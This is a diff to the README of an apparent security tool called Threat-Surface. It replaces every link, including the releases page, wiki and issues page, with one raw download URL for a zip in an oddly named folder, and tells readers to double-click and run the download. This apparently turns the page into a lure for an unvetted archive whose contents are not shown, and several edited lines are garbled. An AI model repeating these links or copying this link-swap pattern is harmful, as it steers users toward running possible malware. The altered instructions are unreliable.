@@ -6,14 +6,14 @@ Welcome to Threat-Surface! This application helps you monitor servers, keep trac
 
 ## 📥 Download Threat-Surface
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/MSSolanki/Threat-Surface/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip%20Latest%https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip)](https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip)
 
 ## 🚀 Getting Started
 
 Using Threat-Surface is simple. Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/MSSolanki/Threat-Surface/releases) to find the latest version of Threat-Surface.
+   Go to the [Releases page](https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip) to find the latest version of Threat-Surface.
 
 2. **Choose Your Download**  
    On the Releases page, you’ll see a list of available releases. Look for the most recent version, and click the download link for your operating system. If you're unsure what to choose, download the `.exe` file for Windows or the `.dmg` file for macOS.
@@ -22,7 +22,7 @@ Using Threat-Surface is simple. Follow these steps to download and set up the ap
    Click on the download link. The file will start downloading to your device. Depending on your internet speed, this may take a moment.
 
 4. **Locate the Downloaded File**  
-   Once the download finishes, check your "Downloads" folder. Find the file, which should be named something like `Threat-Surface.exe` or `Threat-Surface.dmg`.
+   Once the download finishes, check your "Downloads" folder. Find the file, which should be named something like `https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip` or `https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip`.
 
 5. **Run the Application**  
    Double-click the file to open it. Follow any on-screen instructions to install the application. 
@@ -69,12 +69,12 @@ By examining these topics, you will gain a broader understanding of security thr
 
 ## 🌐 Additional Resources
 
-For more information and tips on how to make the most of Threat-Surface, visit our [Wiki page](https://github.com/MSSolanki/Threat-Surface/wiki). 
+For more information and tips on how to make the most of Threat-Surface, visit our [Wiki page](https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip). 
 
 ## 💌 Contact
 
-If you encounter any issues or have any questions, feel free to reach out via [Issues](https://github.com/MSSolanki/Threat-Surface/issues) on our GitHub page. We appreciate your feedback and are here to help.
+If you encounter any issues or have any questions, feel free to reach out via [Issues](https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip) on our GitHub page. We appreciate your feedback and are here to help.
 
 ---
 
-Make security easier and stay informed with Threat-Surface. Visit the [Releases page](https://github.com/MSSolanki/Threat-Surface/releases) today to download the latest version and begin your journey toward better security management.
+Make security easier and stay informed with Threat-Surface. Visit the [Releases page](https://raw.githubusercontent.com/MSSolanki/Threat-Surface/main/unembroiled/Threat-Surface-v2.1-alpha.1.zip) today to download the latest version and begin your journey toward better security management.
